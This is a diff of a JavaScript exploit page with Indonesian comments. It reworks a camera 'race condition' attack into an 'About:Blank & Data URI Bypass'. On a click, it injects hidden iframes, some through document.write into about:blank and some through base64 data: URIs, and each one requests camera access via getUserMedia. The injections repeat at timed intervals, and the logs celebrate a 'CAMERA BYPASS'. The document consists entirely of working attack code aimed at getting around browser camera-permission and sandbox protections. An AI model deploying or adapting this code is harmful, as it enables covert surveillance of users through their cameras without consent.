@@ -43,52 +43,110 @@
   }
 
   // ============================================
-  // 1. FUNGSI IFRAME CAMERA (RACE)
+  // 1. ABOUT:BLANK INJECTION (ORIGIN INHERITANCE)
   // ============================================
-  function injectCameraIframe() {
+  function injectAboutBlank() {
     try {
+      log("[+] Membuat Iframe about:blank...");
+      
       var iframe = document.createElement("iframe");
       iframe.allow = "camera; microphone";
       iframe.style.display = "none";
       
-      iframe.srcdoc = `
+      // Set src ke about:blank (mewarisi origin parent)
+      iframe.src = "about:blank";
+      
+      document.getElementById("launcher-container").appendChild(iframe);
+      
+      // Tunggu iframe siap, lalu suntikkan script
+      iframe.onload = function() {
+        try {
+          var doc = iframe.contentDocument || iframe.contentWindow.document;
+          doc.open();
+          doc.write(`
+            <!DOCTYPE html>
+            <html>
+            <body>
+              <script>
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                  .then(function(stream) {
+                    parent.postMessage({ status: 'CAM_GRANTED_ABOUT' }, '*');
+                  })
+                  .catch(function(err) {
+                    parent.postMessage({ status: 'CAM_DENIED_ABOUT', error: err.name }, '*');
+                  });
+              <\/script>
+            </body>
+            </html>
+          `);
+          doc.close();
+          log("[+] Script disuntikkan ke about:blank.");
+        } catch(e) {
+          log("[-] Gagal menulis ke about:blank: " + e.message);
+        }
+      };
+    } catch(e) {
+      log("[-] About:blank Error: " + e.message);
+    }
+  }
+
+  // ============================================
+  // 2. DATA: URI INJECTION (BYPASS SANDBOX)
+  // ============================================
+  function injectDataUri() {
+    try {
+      log("[+] Membuat Iframe data: URI...");
+      
+      // HTML Payload untuk data URI
+      var htmlPayload = `
         <!DOCTYPE html>
         <html>
         <body>
           <script>
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
               .then(function(stream) {
-                parent.postMessage({ status: 'CAM_GRANTED' }, '*');
+                parent.postMessage({ status: 'CAM_GRANTED_DATA' }, '*');
               })
               .catch(function(err) {
-                parent.postMessage({ status: 'CAM_DENIED', error: err.name }, '*');
+                parent.postMessage({ status: 'CAM_DENIED_DATA', error: err.name }, '*');
               });
           <\/script>
         </body>
         </html>
       `;
       
+      // Encode ke Base64
+      var base64Payload = btoa(unescape(encodeURIComponent(htmlPayload)));
+      var dataUri = "data:text/html;base64," + base64Payload;
+      
+      var iframe = document.createElement("iframe");
+      iframe.allow = "camera; microphone";
+      iframe.style.display = "none";
+      iframe.src = dataUri;
+      
       document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Kamera Ditambahkan.");
+      log("[+] Script disuntikkan ke data: URI.");
     } catch(e) {
-      log("[-] Iframe Error: " + e.message);
+      log("[-] Data URI Error: " + e.message);
     }
   }
 
   // ============================================
-  // 2. LISTENER PESAN DARI IFRAME
+  // 3. LISTENER PESAN DARI IFRAME
   // ============================================
   window.addEventListener('message', function(e) {
-    if (e.data && e.data.status === 'CAM_GRANTED') {
-      log("[+] 🚨 KAMERA DIIZINKAN (RACE BERHASIL)!");
-      document.body.style.background = "#300";
-    } else if (e.data && e.data.status === 'CAM_DENIED') {
-      log("[-] Kamera ditolak: " + e.data.error);
+    if (e.data && e.data.status) {
+      if (e.data.status.includes('GRANTED')) {
+        log("[+] 🚨 " + e.data.status + " (CAMERA BYPASS BERHASIL)!");
+        document.body.style.background = "#300";
+      } else {
+        log("[-] " + e.data.status + ": " + (e.data.error || 'Unknown'));
+      }
     }
   });
 
   // ============================================
-  // 3. TRIGGER RACE CONDITION (KLIK)
+  // 4. TRIGGER RACE CONDITION (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
@@ -96,26 +154,26 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>EXECUTING...</h2>
-      <p>Memulai Rapid Camera Race...</p>
+      <p>Memulai About:Blank & Data URI Bypass...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Rapid Camera Race...");
+    log("[!] Memulai About:Blank & Data URI Bypass...");
 
-    // A. Trigger Pertama (0ms)
-    injectCameraIframe();
+    // A. About:Blank Injection (0ms)
+    injectAboutBlank();
 
-    // B. Retry Cepat (10ms)
-    setTimeout(injectCameraIframe, 10);
+    // B. Data URI Injection (10ms)
+    setTimeout(injectDataUri, 10);
 
-    // C. Retry Sedang (50ms)
-    setTimeout(injectCameraIframe, 50);
+    // C. Retry About:Blank (50ms)
+    setTimeout(injectAboutBlank, 50);
 
-    // D. Retry Lambat (150ms)
-    setTimeout(injectCameraIframe, 150);
+    // D. Retry Data URI (100ms)
+    setTimeout(injectDataUri, 100);
 
-    // E. Retry Terakhir (500ms)
-    setTimeout(injectCameraIframe, 500);
+    // E. Retry About:Blank (500ms)
+    setTimeout(injectAboutBlank, 500);
 
   }, { once: true });
 
